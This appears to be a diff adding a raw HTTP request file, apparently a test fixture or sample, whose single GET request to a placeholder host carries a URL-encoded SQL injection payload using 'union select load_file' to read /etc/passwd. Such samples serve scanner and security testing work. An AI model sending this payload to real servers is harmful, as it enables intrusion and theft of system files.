@@ -1,0 +1,4 @@
+GET /a?input=1%2Bunion%2Bselect%2Bload_file%28%27%2Fetc%2Fpasswd%27%29 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
